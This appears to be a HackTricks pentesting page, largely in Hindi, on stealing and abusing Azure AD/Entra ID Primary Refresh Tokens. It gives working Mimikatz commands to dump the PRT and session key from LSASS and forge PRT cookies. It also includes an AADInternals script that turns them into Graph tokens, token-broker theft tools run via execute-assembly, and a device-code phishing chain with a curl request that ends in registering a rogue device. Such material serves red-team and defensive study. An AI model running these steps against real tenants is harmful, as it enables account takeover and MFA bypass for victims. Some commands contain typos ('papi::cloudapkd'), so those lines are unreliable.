# Az - Primary Refresh Token (PRT)

{{#include ../../../banners/hacktricks-training.md}}

## What is a Primary Refresh Token (PRT)?

A **Primary Refresh Token (PRT)** एक दीर्घकालिक रिफ्रेश टोकन है जो Azure AD (Entra ID) प्रमाणीकरण में उपयोग किया जाता है, जो Kerberos TGT के समान है। यह Azure AD-से जुड़े डिवाइस पर उपयोगकर्ता लॉगिन के समय जारी किया जाता है और इसे विभिन्न अनुप्रयोगों के लिए एक्सेस टोकन अनुरोध करने के लिए उपयोग किया जा सकता है बिना क्रेडेंशियल्स को फिर से पूछे। प्रत्येक PRT के साथ एक **सत्र कुंजी** (जिसे प्रमाण-स्वामित्व कुंजी भी कहा जाता है) होती है -- एक सममित कुंजी जो अनुरोधों पर हस्ताक्षर करने और यह साबित करने के लिए उपयोग की जाती है कि क्लाइंट के पास PRT है। PRT स्वयं एक अपारदर्शी, एन्क्रिप्टेड ब्लॉब है (जो क्लाइंट द्वारा पढ़ा नहीं जा सकता), जबकि सत्र कुंजी का उपयोग टोकन अनुरोध करते समय PRT को शामिल करने वाले JWT पर **हस्ताक्षर** करने के लिए किया जाता है। दूसरे शब्दों में, केवल PRT का स्वामित्व पर्याप्त नहीं है; एक हमलावर को वैधता साबित करने के लिए सत्र कुंजी की आवश्यकता होती है, जैसे कि प्रमाणीकरण के लिए Kerberos TGT और इसकी सत्र कुंजी दोनों की आवश्यकता होती है।

Windows पर, PRT और सत्र कुंजी को CloudAP प्लगइन के माध्यम से LSASS प्रक्रिया में कैश किया जाता है। यदि किसी डिवाइस में **TPM** (विश्वसनीय प्लेटफ़ॉर्म मॉड्यूल) है, तो Azure AD कुंजियों को अतिरिक्त सुरक्षा के लिए TPM से बांधता है। इसका मतलब है कि TPM-सुसज्जित उपकरणों पर, सत्र कुंजी TPM के भीतर संग्रहीत या उपयोग की जाती है ताकि इसे सामान्य परिस्थितियों में मेमोरी से सीधे पढ़ा न जा सके। यदि कोई TPM उपलब्ध नहीं है (जैसे कि कई VMs या पुराने सिस्टम), तो कुंजियाँ सॉफ़्टवेयर में रखी जाती हैं और DPAPI एन्क्रिप्शन के साथ सुरक्षित की जाती हैं। दोनों मामलों में, एक हमलावर जिसके पास प्रशासनिक विशेषाधिकार या मशीन पर कोड निष्पादन है, वह **मेमोरी से PRT और सत्र कुंजी को डंप करने** का प्रयास कर सकता है और फिर उन्हें क्लाउड में उपयोगकर्ता का अनुकरण करने के लिए उपयोग कर सकता है। सामान्य रिफ्रेश टोकनों के विपरीत (जो आमतौर पर अनुप्रयोग-विशिष्ट होते हैं), एक PRT व्यापक है, जिससे आपके डिवाइस को लगभग किसी भी Entra ID-एकीकृत संसाधन या सेवा के लिए टोकन अनुरोध करने की अनुमति मिलती है।

## How Does a PRT Work?

Here's a simplified breakdown of how a PRT operates:

1.  **Device Registration:**

-   जब आपका डिवाइस (जैसे Windows लैपटॉप या मोबाइल फोन) Entra ID से जुड़ता है या पंजीकरण करता है, तो यह आपके क्रेडेंशियल्स (उपयोगकर्ता नाम/पासवर्ड/MFA) का उपयोग करके प्रमाणीकरण करता है।

-   सफल प्रमाणीकरण के बाद, Entra ID एक PRT जारी करता है जो विशेष रूप से आपके डिवाइस से बंधा होता है।

2.  **Token Storage:**

-   PRT को आपके डिवाइस पर सुरक्षित रूप से संग्रहीत किया जाता है, अक्सर Trusted Platform Module (TPM) जैसी हार्डवेयर सुविधाओं द्वारा सुरक्षित किया जाता है, यह सुनिश्चित करते हुए कि इसे अनधिकृत पक्षों द्वारा निकालना या दुरुपयोग करना कठिन है।

3.  **Single Sign-On (SSO):**

-   प्रत्येक बार जब आप Entra ID-सुरक्षित अनुप्रयोग (जैसे Microsoft 365 ऐप्स, SharePoint, Teams) तक पहुँचते हैं, तो आपका डिवाइस चुपचाप संग्रहीत PRT का उपयोग करके उस ऐप के लिए एक विशिष्ट एक्सेस टोकन अनुरोध करता है और प्राप्त करता है।

-   आपको बार-बार अपने क्रेडेंशियल्स दर्ज करने की आवश्यकता नहीं है क्योंकि PRT प्रमाणीकरण को पारदर्शी रूप से संभालता है।

4.  **Renewal and Security:**

-   PRT की लंबी आयु होती है (आमतौर पर लगभग 14 दिन), लेकिन जब तक आपका डिवाइस सक्रिय रूप से उपयोग में है, तब तक इसे लगातार नवीनीकरण किया जाता है।

-   यदि आपका डिवाइस समझौता कर लिया जाता है या खो जाता है, तो प्रशासक आपके PRT को दूरस्थ रूप से रद्द कर सकते हैं, तुरंत अनधिकृत पहुँच को अवरुद्ध कर सकते हैं।

### Why are PRTs Powerful?

-   **Universal Access:** सामान्य टोकनों के विपरीत जो एक ऐप या संसाधन तक सीमित होते हैं, एक PRT सभी Entra ID-एकीकृत सेवाओं तक पहुँच को सुविधाजनक बना सकता है।

-   **Enhanced Security:** TPM जैसी अंतर्निहित हार्डवेयर सुरक्षा के साथ, PRT सुरक्षित टोकन भंडारण और उपयोग सुनिश्चित करते हैं।

-   **User Experience:** PRT उपयोगकर्ता अनुभव को महत्वपूर्ण रूप से सुधारते हैं, बार-बार प्रमाणीकरण संकेतों को कम करते हैं और वास्तविक निर्बाध SSO को सक्षम करते हैं।

## How to know if a PRT is present?

- Check if PRT is present:
```bash
# Execute
dsregcmd /status
## Check if the value of AzureAdPrt is set to YES
```
- TPM द्वारा संरक्षित है या नहीं, इसकी जांच करें:
```bash
Get-Tpm | Select TpmPresent,TpmReady,TpmEnabled,TpmOwned
# TpmPresent/Ready = True indicates the device can bind secrets to TPM.

dsregcmd /status
# In Device State / WHfB prerequisites you’ll typically see:
# KeyProvider = Microsoft Platform Crypto Provider ⇒ TPM hardware key;
# KeyProvider = Software Key Storage Provider ⇒ not TPM‑bound.
# Some builds also show TpmProtected: YES/NO and KeySignTest (run elevated to test).
```
## Dump and user unprotected PRTs

According to [this post](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) on Windows devices **without TPM binding**, the PRT and its session key LSASS (CloudAP plug‑in) में रहते हैं। उस डिवाइस पर स्थानीय admin/SYSTEM के साथ, PRT blob और DPAPI‑encrypted session key को **LSASS से पढ़ा जा सकता है, session key को DPAPI के माध्यम से decrypted किया जा सकता है, और signing key को derived किया जा सकता है** ताकि एक मान्य PRT cookie (`x‑ms‑RefreshTokenCredential`) बनाया जा सके। आपको PRT और इसके session key दोनों की आवश्यकता है—केवल PRT string पर्याप्त नहीं है।

### Mimikatz
```bash
privilege::debug
sekurlsa::cloudap
```
**PRT क्षेत्र** में एन्क्रिप्टेड रिफ्रेश टोकन होता है (आमतौर पर base64 स्ट्रिंग), और ProofOfPossessionKey में KeyValue DPAPI-एन्क्रिप्टेड सत्र कुंजी है (यह भी base64 है)।

फिर, **`sekurlsa::cloudap`** आउटपुट से, `ProofOfPossessionKey` क्षेत्र के अंदर **`KeyValue`** से base64 ब्लॉब कॉपी करें (यह DPAPI के साथ एन्क्रिप्टेड सत्र कुंजी है)। इस एन्क्रिप्टेड कुंजी का उपयोग सीधे नहीं किया जा सकता – इसे सिस्टम के DPAPI क्रेडेंशियल्स का उपयोग करके डिक्रिप्ट किया जाना चाहिए।

क्योंकि सिस्टम रहस्यों के लिए DPAPI एन्क्रिप्शन मशीन के सिस्टम संदर्भ की आवश्यकता होती है, अपने टोकन को SYSTEM में बढ़ाएं और Mimikatz के DPAPI मॉड्यूल का उपयोग करके डिक्रिप्ट करें:
```bash
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
```
`token::elevate` SYSTEM का अनुकरण करेगा और `dpapi::cloudapkd` कमांड `/unprotect` के साथ DPAPI मास्टर कुंजी का उपयोग करके प्रदान किए गए KeyValue ब्लॉब को डिक्रिप्ट करेगा। इससे स्पष्ट-टेक्स्ट सत्र कुंजी और संबंधित Derived Key और Context प्राप्त होता है जो साइनिंग के लिए उपयोग किया जाता है:
- **Clear key** – स्पष्ट टेक्स्ट में 32-बाइट सत्र कुंजी (हैक्स स्ट्रिंग के रूप में प्रदर्शित)।
- **Derived Key** – सत्र कुंजी और एक संदर्भ मान से निकाली गई 32-बाइट कुंजी (इस पर नीचे अधिक)।
- **Context** – 24-बाइट यादृच्छिक संदर्भ जो PRT कुकी के लिए साइनिंग कुंजी निकालते समय उपयोग किया गया था।

> [!NOTE]
> यदि यह आपके लिए उपयोगकर्ता का अनुकरण करने के लिए काम नहीं करता है, तो **`AADInternals`** का उपयोग करते हुए निम्नलिखित अनुभाग की जांच करें।

फिर, आप एक मान्य PRT कुकी उत्पन्न करने के लिए mimikatz का भी उपयोग कर सकते हैं:
```bash
# Context is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# Derivedkey is obtained from papi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# PRT is obtained from sekurlsa::cloudap (filed "Prt"
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
```
Mimikatz एक साइन किया हुआ JWT (जिसे `PRT cookie` कहा जाता है) "Signature with key" लाइन के बाद आउटपुट करेगा, जिसमें PRT होता है और इसे प्राप्त कुंजी का उपयोग करके साइन किया जाता है। इस JWT को कॉपी किया जा सकता है और फिर एक वेब सत्र में उपयोग किया जा सकता है। उदाहरण के लिए, एक हमलावर एक ब्राउज़र खोल सकता है, `login.microsoftonline.com` पर जा सकता है, और एक कुकी सेट कर सकता है जिसका नाम `x-ms-RefreshTokenCredential` है और जिसका मान यह JWT है। जब ब्राउज़र रिफ्रेश या नेविगेट करता है, Azure AD सत्र को प्रमाणित के रूप में मानता है (PRT कुकी को इस तरह प्रस्तुत किया जाता है जैसे SSO हुआ हो), और यह निर्दिष्ट संसाधन के लिए एक प्राधिकरण कोड या एक्सेस टोकन जारी करेगा। प्रैक्टिस में, कोई Office 365 या Azure पोर्टल जैसे संसाधन पर नेविगेट करेगा; एक मान्य PRT कुकी की उपस्थिति का मतलब है कि Azure AD बिना अतिरिक्त लॉगिन के एक्सेस प्रदान करेगा (MFA को बायपास करते हुए, क्योंकि PRT पहले से प्रमाणित है)।

आप **`roadtx`** और **`roadrecon`** का उपयोग PRT कुकी के PRT के साथ उपयोगकर्ता का अनुकरण करने के लिए भी कर सकते हैं *(TODO: Find the exact command lines to use roadtx/roadrecon to get credentials from a PRT)*।

### AADInternals

**`AADInternals`** PowerShell मॉड्यूल को पहले प्राप्त PRT और सत्र कुंजी के साथ एक मान्य PRT टोकन उत्पन्न करने के लिए भी उपयोग किया जा सकता है। यह एक नए PRT टोकन को नॉनस के साथ प्राप्त करने की प्रक्रिया को स्वचालित करने के लिए उपयोगी है, जिसे Azure AD Graph API या अन्य संसाधनों के लिए एक्सेस टोकन प्राप्त करने के लिए उपयोग किया जा सकता है:
```bash
# Code from https://aadinternals.com/post/prt/
# Add the PRT to a variable
$MimikatzPRT = "MS5BVUVCNFdiUV9UZnV2RW13ajlEaFVoR2JCSWM3cWpodG9CZElzblY2TVdtSTJUdENBY1JCQVEuQWdBQkF3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQO...R0RjNFQ0QxaHJ1RFdJeHZUM0stWjJpQVhmMnBLeWpPaHBIOVc"

# Add padding
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}

# Convert from Base 64
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Add the session key (Clear key) to a variable
$MimikatzKey = "7ee0b1f2eccbae440190bf0761bc52099ad7ae7d10d28bd83b67a81a0dfa0808"

# Convert to byte array and base 64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate a new PRTToken with nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey

# Get an access token for MS Graph API
Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
```
This obtains a fresh PRT cookie (with a nonce) and then uses it to fetch an access token for the Azure AD Graph API(demonstrating cloud access on behalf of the user). AADInternals abstracts much of the cryptography and uses Windows components or its own logic under the hood.

## Abusing protected PRTs

Despite the mentioned protections, an attacker who has already compromised a device (as a local user or even SYSTEM) can still **abuse the PRT to obtain fresh access tokens** by leveraging Windows' own token broker APIs and security components. Instead of **extracting** the raw PRT or key, the attacker essentially **"asks" Windows to use the PRT on their behalf**. In the sections below, we outline currently valid techniques for abusing PRTs and their session keys on up-to-date Windows devices where TPM protections are in effect. All these techniques assume post-exploitation access on the target machine, and **focus on abusing built-in authentication flows** (no unpatched vulnerabilities needed).

### Windows Token Broker Architecture and SSO Flow

Modern Windows handles cloud authentication via a built-in **token broker** stack, which includes components in both user mode and LSASS (Local Security Authority). Key pieces of this architecture include:

-   **LSASS CloudAP Plugin:** When a device is Azure AD joined, LSASS loads cloud authentication packages (e.g. `CloudAP.dll`, `aadcloudap.dll`, `MicrosoftAccountCloudAP.dll`) that manage PRTs and token requests. LSASS (running as SYSTEM) orchestrates PRT storage, renewal, and usage, and interfaces with the TPM to perform cryptographic operations (like signing a PRT challenge with the session key).

-   **Web Account Manager (WAM):** The Windows Web Account Manager is a user-mode framework (accessible via COM/WinRT APIs) that allows applications or browsers to request tokens for cloud accounts without prompting for credentials. WAM acts as a broker between user applications and the secure LSASS/TPM-backed PRT. For example, Microsoft's MSAL library and certain OS components use WAM to silently acquire tokens using the logged-in user's PRT.

-   **BrowserCore.exe and Token Broker COM interfaces:** For browser SSO, Windows includes a component called **BrowserCore.exe** (located under *Windows Security\BrowserCore*). This is a native messaging host used by browsers (Edge, Chrome via an extension, etc.) to obtain a PRT-derived SSO token for Azure AD login. Under the hood, BrowserCore leverages a COM object provided by `MicrosoftAccountTokenProvider.dll` to retrieve a PRT-based cookie/token. In essence, this COM interface is a first-party "token broker" API that any process running as the user can obscall to get an SSO token (provided the user has a valid PRT in LSASS).

When an Azure AD joined user tries to access a resource (say, the Azure Portal), the flow is typically: an application calls into WAM or BrowserCore's COM interface, which in turn communicates with LSASS. LSASS uses the PRT and session key (secured by TPM) to produce an **SSO token** -- often called a **PRT cookie** -- which is then given back to the application or browser. The PRT cookie is a special JWT containing the encrypted PRT and a nonce, signed with a key derived from the PRT's session key. This cookie is sent to Azure AD (in an `x-ms-RefreshTokenCredential` header) to prove the device and user hold a valid PRT, allowing Azure AD to issue standard OAuth refresh and access tokens for various applications. Notably, any Multi-Factor Authentication (MFA) claim present in the PRT will be carried into tokens obtained via this SSO process, meaning PRT-derived tokens can satisfy MFA-protected resources.

### User-Level Token Theft (Non-Admin)

When an attacker has **user-level code execution**, the TPM protection of PRT doesn't stop the attacker from obtaining tokens. The attacker **leverages built-in Windows Token Broker APIs**:

#### **BrowserCore (MicrosoftAccountTokenProvider COM)**

BrowserCore exposes a COM class (`MicrosoftAccountTokenProvider`, CLSID `{a9927f85-a304-4390-8b23-a75f1c668600}`) to fetch PRT cookies. This COM API is invoked legitimately by browsers (Chrome/Edge extensions) for Azure AD SSO.

-   **[RequestAADRefreshToken](https://github.com/leechristensen/RequestAADRefreshToken)**
```bash
RequestAADRefreshToken.exe --uri https://login.microsoftonline.com
```
*(Azure AD रिफ्रेश टोकन या PRT कुकी लौटाता है)*

- **[ROADtoken](https://github.com/dirkjanm/ROADtoken)** & **[ROADtools](https://github.com/dirkjanm/ROADtools)**
```bash
ROADtoken.exe --nonce <nonce-value>
roadrecon auth --prt-cookie <cookie>
```
*(नॉन्स उत्पन्न करता है, PRT कुकी प्राप्त करने के लिए BrowserCore को सक्रिय करता है, फिर इसे ROADtools के माध्यम से भुनाता है)*


### **वेब खाता प्रबंधक (WAM) एपीआई**

हमलावर वैध Microsoft प्रमाणीकरण पुस्तकालयों (**MSAL**, **WAM APIs**, **WebAuthenticationCoreManager**) का उपयोग करते हैं जो उपयोगकर्ता-स्तरीय प्रक्रियाओं से चुपचाप TPM-संरक्षित PRT का लाभ उठाकर टोकन प्राप्त करते हैं।


-   **[aadprt](https://posts.specterops.io/)**
```bash
execute-assembly aadprt.exe
```
*(COM इंटरफेस के माध्यम से PRT कुकी प्राप्त करता है)*

-   **[listwamaccounts](https://posts.specterops.io/)**
```bash
execute-assembly listwamaccounts.exe
```
*(Azure AD खातों की सूची जो WAM के माध्यम से लॉग इन हैं; टोकन लक्ष्यों की पहचान करता है)*

-   **सामान्य उदाहरण (PowerShell के साथ MSAL)**:
```powershell
$app = [Microsoft.Identity.Client.PublicClientApplicationBuilder]::Create("client-id").Build()
$result = $app.AcquireTokenSilent(@("https://graph.microsoft.com/.default"), $app.GetAccountsAsync().Result[0]).ExecuteAsync().Result
$result.AccessToken
```
*(चुपचाप PRT का उपयोग करके एक एक्सेस टोकन प्राप्त करता है)*

#### व्यवस्थापक / SYSTEM-स्तरीय टोकन दुरुपयोग

यदि हमलावर **व्यवस्थापक या SYSTEM** में वृद्धि करता है, तो वे सीधे किसी भी Azure AD लॉग-ऑन उपयोगकर्ता का अनुकरण कर सकते हैं और उसी **COM/WAM टोकन ब्रोकर APIs** का उपयोग कर सकते हैं। TPM-संरक्षित PRTs इस वैध टोकन जारी करने से रोकते नहीं हैं।

### **उपयोगकर्ता अनुकरण और टोकन पुनर्प्राप्ति**

व्यवस्थापक/SYSTEM अन्य उपयोगकर्ताओं के चल रहे सत्रों का अनुकरण कर सकते हैं ताकि टोकन उत्पन्न करने के लिए BrowserCore या WAM को सक्रिय किया जा सके।

इसके लिए बस उपयोगकर्ता प्रक्रिया (जैसे, `explorer.exe`) का अनुकरण करें और पिछले अनुभाग में टिप्पणी की गई किसी भी तकनीक का उपयोग करके टोकन ब्रोकर APIs को सक्रिय करें।

### **प्रत्यक्ष LSASS और टोकन ब्रोकर इंटरैक्शन (उन्नत)**

एक व्यवस्थापक अभी भी PRT का दुरुपयोग करने के लिए LSASS के साथ काम कर सकता है: उदाहरण के लिए, एक व्यवस्थापक LSASS में कोड इंजेक्ट कर सकता है या LSASS को टोकन उत्पन्न करने के लिए आंतरिक CloudAP कार्यों को कॉल कर सकता है। डिर्क-जान के शोध ने नोट किया कि एक व्यवस्थापक “क्रिप्टो APIs का उपयोग करके LSASS में PRT कुंजियों के साथ बातचीत कर सकता है”। व्यावहारिक रूप से, इसका मतलब हो सकता है कि LSASS के अपने कार्यों का उपयोग (यदि उपलब्ध हो तो API हुकिंग या RPC जैसी तकनीक के माध्यम से) PRT कुकी उत्पन्न करने के लिए किया जाए। एक और दृष्टिकोण यह है कि किसी भी विंडो का लाभ उठाया जाए जहां सत्र कुंजी मेमोरी में प्रकट हो सकती है - उदाहरण के लिए, PRT नवीनीकरण या डिवाइस पंजीकरण के क्षण में जब इसका उपयोग के लिए अनएन्क्रिप्ट किया गया हो। ऐसे हमले काफी अधिक जटिल और परिस्थितिजन्य होते हैं। एक अधिक सीधा व्यवस्थापक रणनीति मौजूदा टोकन हैंडल या कैश का दुरुपयोग करना है: LSASS हाल ही में जारी किए गए रिफ्रेश टोकन को मेमोरी में कैश करता है (DPAPI के साथ एन्क्रिप्ट किया गया)। एक दृढ़ SYSTEM हमलावर इन DPAPI-संरक्षित टोकनों को निकालने का प्रयास कर सकता है (उपयोगकर्ता की मास्टर कुंजी का उपयोग करके, जिसे एक व्यवस्थापक प्राप्त कर सकता है) ताकि विशिष्ट अनुप्रयोगों के लिए सीधे रिफ्रेश टोकन चुराए जा सकें। हालाँकि, सबसे आसान और सबसे सामान्य विधि अनुकरण और प्रलेखित टोकन ब्रोकर इंटरफेस का उपयोग करना है, क्योंकि ये सुनिश्चित करते हैं कि Azure AD ताजा टोकन जारी करेगा (सभी उचित दावों के साथ) बजाय इसके कि एन्क्रिप्शन को क्रैक करने का प्रयास किया जाए।

## PRT फ़िशिंग

**OAuth डिवाइस कोड** प्रवाह का दुरुपयोग करें **Microsoft Authentication Broker क्लाइंट ID** (**`29d9ed98-a469-4536-ade2-f981bc1d605e`**) और **डिवाइस पंजीकरण सेवा (DRS)** संसाधन का उपयोग करके एक **रिफ्रेश टोकन प्राप्त करें जिसे एक प्राथमिक रिफ्रेश टोकन (PRT) में अपग्रेड किया जा सकता है** एक **धोखाधड़ी डिवाइस** पंजीकरण के बाद।

### **यह क्यों काम करता है**

-   **PRT** **डिवाइस-बाउंड** है और **(लगभग) किसी भी Entra-संरक्षित ऐप के लिए SSO सक्षम करता है**।
-   **ब्रोकर क्लाइंट + DRS** संयोजन एक फ़िश्ड **रिफ्रेश टोकन** को **PRT के लिए विनिमय** करने की अनुमति देता है जब एक डिवाइस पंजीकृत होता है।
-   **MFA को बायपास नहीं किया गया है**: **उपयोगकर्ता फ़िश के दौरान MFA करता है**; **MFA दावे** परिणामी PRT में फैलते हैं, जिससे हमलावर को **बिना किसी और प्रॉम्प्ट के** ऐप्स तक पहुंचने की अनुमति मिलती है।

**पूर्वापेक्षाएँ**:

-   **डिवाइस कोड के माध्यम से उपयोगकर्ता प्रमाणीकरण** **ब्रोकर क्लाइंट ID** (`29d9ed98-a469-4536-ade2-f981bc1d605e`) और **DRS स्कोप/संसाधन** (जैसे, **`01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default`** या **`https://enrollment.manage.microsoft.com/`**) का उपयोग करके।
-   **उपयोगकर्ता Entra ID में डिवाइस पंजीकृत कर सकता है** (**डिफ़ॉल्ट: अनुमति दी गई**, लेकिन इसे प्रतिबंधित या कोटा-सीमित किया जा सकता है)।
-   **कोई अवरोध CA नीतियाँ नहीं** जो **डिवाइस कोड को अक्षम** करती हैं या **लक्षित ऐप्स के लिए अनुपालन/हाइब्रिड डिवाइस की आवश्यकता** करती हैं (वे PRT जारी करने को रोकेंगी, लेकिन **इसे** संरक्षित ऐप्स तक पहुंचने के लिए **उपयोग करने** से रोकेंगी)।
-   **हमलावर-नियंत्रित होस्ट** प्रवाह को चलाने और टोकन/डिवाइस कुंजी रखने के लिए।

**हमला प्रवाह**:

1.  **क्लाइंट_id = ब्रोकर** और **DRS स्कोप/संसाधन** के साथ **डिवाइस कोड प्रमाणीकरण शुरू करें**; पीड़ित को **उपयोगकर्ता कोड** दिखाएँ।
```bash
curl -s -X POST \
"https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
-d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e" \
-d "scope=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default offline_access openid profile"
```
2.  **शिकार Microsoft की साइट पर साइन इन करता है** (वैध UI) और **MFA** पूरा करता है → **हमलावर को DRS-स्कोप वाला रिफ्रेश टोकन** मिलता है Broker क्लाइंट के लिए।

3.  **उस रिफ्रेश टोकन का उपयोग करके टेनेट में एक धोखाधड़ी डिवाइस रजिस्टर करें** (डिवाइस ऑब्जेक्ट बनाया जाता है और शिकार के साथ लिंक किया जाता है)।

4.  **रिफ्रेश टोकन + डिवाइस पहचान/कीज़** का आदान-प्रदान करके **PRT** में **अपग्रेड करें** → **PRT** हमलावर के डिवाइस से बंधा होता है।

5.  **(वैकल्पिक स्थायीता)**: यदि MFA ताजा था, तो **Windows Hello for Business की** रजिस्टर करें ताकि **दीर्घकालिक, पासवर्ड रहित पहुंच** बनी रहे।

6.  **दुरुपयोग**: उपयोगकर्ता के रूप में **एक्सचेंज/ग्राफ/शेयरपॉइंट/टीम्स/कस्टम ऐप्स** के लिए **एक्सेस टोकन** प्राप्त करने के लिए **PRT** (या **PRT कुकी** बनाना) भुनाएं। 


### सार्वजनिक उपकरण और प्रमाण-का-धारणा

- [ROADtools/ROADtx](https://github.com/dirkjanm/ROADtools): OAuth प्रवाह, डिवाइस रजिस्ट्रेशन, और टोकन अपग्रेड को स्वचालित करता है।
- [DeviceCode2WinHello](https://github.com/kiwids0220/deviceCode2WinHello): एकल-आदेश स्क्रिप्ट जो डिवाइस कोड फ़िश-टू-PRT+WHfB कुंजी को स्वचालित करती है। 


## संदर्भ

- [Dirkjan का PRT पर ब्लॉग पोस्ट](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [Dirkjan का PRTs को फ़िशिंग करने पर पोस्ट](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [Dirkjan का PRTs के दुरुपयोग पर पोस्ट](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- SpecterOps पोस्ट पर [Azure AD अनुरोध टोकन का अनुरोध करना](https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30)
- [AADInternals का PRTs पर पोस्ट](https://aadinternals.com/post/prt/)
- [blog.3or.de](https://blog.3or.de/understanding-primary-refresh-tokens-and-cve-2021-33779-how-pass-the-prt-was-eliminated#:~:text=,the%20Token%20Broker%20on%20Windows)

{{#include ../../../banners/hacktricks-training.md}}
